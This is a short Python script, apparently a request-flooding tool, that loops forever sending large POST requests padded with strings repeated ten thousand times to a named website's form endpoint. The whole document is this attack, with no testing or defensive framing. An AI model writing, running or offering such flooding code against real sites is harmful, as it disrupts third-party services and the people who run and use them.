import httpx
with httpx.Client() as client:
    while True:
        httpx.post('https://pausenflirt.com/panda/', data={'name_one': 'Pauli'*10000, 'name_two': 'Versace'*10000})